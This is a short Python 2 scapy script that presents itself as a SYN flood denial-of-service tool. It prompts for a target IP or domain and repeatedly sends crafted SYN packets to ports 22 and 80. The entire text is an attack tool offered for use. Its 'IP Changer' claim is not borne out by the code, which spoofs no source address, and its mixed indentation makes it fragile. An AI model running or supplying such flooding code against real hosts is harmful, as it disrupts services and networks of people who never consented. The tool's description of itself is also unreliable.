#[5]:SYN Flooder Tools
#This tool is used to implement the Syn Flooding attack, which is a Denial-Of-Service attack
from colorama import Fore
from scapy.all import *
def Syn():
	print """
	 #####               #######                                           
	#     # #   # #    # #       #       ####   ####  #####  ###### #####  
	#        # #  ##   # #       #      #    # #    # #    # #      #    # 
	 #####    #   # #  # #####   #      #    # #    # #    # #####  #    # 
      #   #   #  # # #       #      #    # #    # #    # #      #####  
	#     #   #   #   ## #       #      #    # #    # #    # #      #   #  
	 #####    #   #    # #       ######  ####   ####  #####  ###### #    # 
	"""

        print "This The Syn Flooding Tools With IP Changer"
        TargetIP = raw_input("Plese Enter The Target IP or Domain: ")
        print Fore.RED + "Field Values of packet send"

        p=IP(dst=TargetIP,id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
        ls(p)
        print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
        ans,unans=srloop(p,inter=0.3,retry=2,timeout=4)
        print "Summary of answered & unanswered packets"
        ans.summary()
        unans.summary()
        print "source port flags in response"
        ans.make_table(lambda(s,r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))


